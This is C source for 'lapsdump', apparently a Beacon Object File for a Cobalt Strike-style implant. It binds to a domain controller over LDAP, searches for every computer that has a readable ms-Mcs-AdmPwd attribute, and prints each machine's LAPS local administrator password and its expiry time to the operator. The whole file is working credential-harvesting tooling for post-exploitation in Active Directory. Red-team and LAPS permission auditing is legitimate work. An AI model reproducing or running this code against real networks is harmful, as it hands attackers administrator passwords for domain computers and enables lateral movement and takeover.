/*
 * lapsdump - read LAPS passwords (ms-Mcs-AdmPwd) from AD.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"
#include "ldaphelpers.h"

void go(char *args, int alen)
{
    char base[512];
    LDAP *ld;
    LDAPMessage *res = NULL, *e;
    PCHAR attrs[4];
    ULONG rc;
    int count = 0;

    (void)args; (void)alen;

    ld = bof_ldap_open_ex(&rc);
    if (!ld) {
        bof_error_ldap("ldap_init/bind", rc,
                       "cannot reach or authenticate to a domain controller");
        return;
    }
    if (bof_ldap_default_nc_ex(ld, base, sizeof(base), &rc) != 0) {
        bof_error_ldap("rootDSE defaultNamingContext", rc,
                       "cannot read the domain naming context");
        WLDAP32$ldap_unbind(ld);
        return;
    }

    attrs[0] = "cn";
    attrs[1] = "ms-Mcs-AdmPwd";
    attrs[2] = "ms-Mcs-AdmPwdExpirationTime";
    attrs[3] = NULL;

    rc = WLDAP32$ldap_search_ext_sA(ld, base, LDAP_SCOPE_SUBTREE,
            "(&(objectCategory=computer)(ms-Mcs-AdmPwd=*))",
            attrs, 0, NULL, NULL, NULL, 1000, &res);
    if (rc != LDAP_SUCCESS) {
        bof_error_ldap("LAPS ldap_search", rc,
                       "cannot enumerate LAPS-enabled computers");
        bof_error_context("base", base);
        WLDAP32$ldap_unbind(ld);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "LAPS passwords\n");
    for (e = WLDAP32$ldap_first_entry(ld, res); e; e = WLDAP32$ldap_next_entry(ld, e)) {
        struct berval **cn = WLDAP32$ldap_get_values_lenA(ld, e, "cn");
        struct berval **pw = WLDAP32$ldap_get_values_lenA(ld, e, "ms-Mcs-AdmPwd");
        struct berval **exp = WLDAP32$ldap_get_values_lenA(ld, e, "ms-Mcs-AdmPwdExpirationTime");

        if (pw && pw[0]) {
            BeaconPrintf(CALLBACK_OUTPUT, "  %-32s ",
                         (cn && cn[0]) ? cn[0]->bv_val : "(unnamed)");
            bof_ldap_print_value(pw[0]);
            if (exp && exp[0])
                BeaconPrintf(CALLBACK_OUTPUT, "  (expires %s)", exp[0]->bv_val);
            BeaconPrintf(CALLBACK_OUTPUT, "\n");
            count++;
        }
        if (cn) WLDAP32$ldap_value_free_len(cn);
        if (pw) WLDAP32$ldap_value_free_len(pw);
        if (exp) WLDAP32$ldap_value_free_len(exp);
    }

    WLDAP32$ldap_msgfree(res);
    WLDAP32$ldap_unbind(ld);
    BeaconPrintf(CALLBACK_OUTPUT, "\nComputers with LAPS: %d\n", count);
}
